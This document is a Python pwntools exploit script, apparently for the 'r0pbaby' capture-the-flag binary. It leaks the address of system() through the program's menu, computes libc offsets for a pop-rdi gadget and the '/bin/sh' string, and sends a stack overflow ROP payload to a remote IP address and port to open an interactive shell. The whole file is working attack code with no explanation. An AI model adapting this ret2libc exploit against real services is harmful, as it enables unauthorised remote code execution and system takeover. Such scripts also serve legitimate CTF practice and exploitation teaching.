#!/usr/bin/python

from pwn import *



def get_addr_sys(sh):
    print(sh.recvuntil("4) Exit\n: "))
    #sh.recv()
    sh.sendline('2')
    sh.recvuntil("Enter symbol: ")
    sh.sendline('system')
    m = sh.recvline()
    ret = m.split(' ')[-1]
    print(m)
    #sh.recv()
    print(ret)
    ret = long(ret, 16)
    return ret


def get_shell(sh, addr_sys, ppc_offset, bin_sh_offset):
    print('addr_sys: %x' % addr_sys)
    print('pop_pop_call_offset: %x' % ppc_offset)
    print('bin_sh_offset: %x' % bin_sh_offset)
    #print(sh.recv())
    print(sh.recvuntil("4) Exit\n: "))
    sh.sendline("3")
    print("333\n")
    print(sh.recv())


    sh.sendline("32")
    print("32  23")
    payload = 'A'*8 + p64(addr_sys+ppc_offset) +p64(addr_sys)+p64(addr_sys+bin_sh_offset)
    print(len(payload))
    sh.sendline(payload)
    #sh.recv()
    return


#libc = ELF("libc32.so.2")
#print(libc.symbols['system'])
#binsh_libc = libc.search('/bin/sh').next()
#print(binsh_libc)
#r = process('./r0pbaby')
r = remote("106.15.186.69",30025)
#gdb.attach(r)
addr_sys = get_addr_sys(r)

libc_addr_pop_rdi = 0x12188b
libc_addr_bin_sh = 0x1b3e9a
libc_addr_sys = 0x4f440
print(addr_sys)

ppc_offset = libc_addr_pop_rdi - libc_addr_sys
bin_sh_offset = libc_addr_bin_sh - libc_addr_sys
get_shell(r, addr_sys, ppc_offset, bin_sh_offset)
r.interactive()

